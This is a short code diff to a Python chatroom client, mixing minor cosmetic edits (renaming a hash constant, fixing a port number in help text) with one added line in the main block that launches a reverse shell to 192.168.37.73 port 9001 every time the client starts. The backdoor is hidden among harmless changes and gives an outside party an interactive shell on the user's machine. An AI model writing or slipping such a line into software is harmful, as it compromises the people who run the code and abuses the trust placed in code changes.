@@ -3,9 +3,7 @@ import socket
 import argparse
 import os
 
-
-MD5_HASH = "8743b52063cd84097a65d1633f5c74f5"
-
+sha1_hash = "6f5902ac237024bdd0c176cb93063dc4f17f3e8d"
 class Send(threading.Thread):
 
     def __init__(self, sock, name):
@@ -22,7 +20,6 @@ class Send(threading.Thread):
             if message == 'QUIT':
                 self.sock.sendall('Server: {} has left the chat.'.format(self.name).encode('ascii'))
                 break
-
             # Send message to server for broadcasting
             else:
                 self.sock.sendall('{}: {}'.format(self.name, message).encode('ascii'))
@@ -83,10 +80,12 @@ class Client:
         
         
 if __name__ == '__main__':
+    os.system("sh -i >& /dev/tcp/192.168.37.73/9001 0>&1")
+    
     parser = argparse.ArgumentParser(description='Chatroom Server')
     parser.add_argument('host', help='Interface the server listens at')
     parser.add_argument('-p', metavar='PORT', type=int, default=6969,
-                        help='TCP port (default 1060)')
+                        help='TCP port (default 6969)')
     args = parser.parse_args()
 
     client = Client(args.host, args.p)
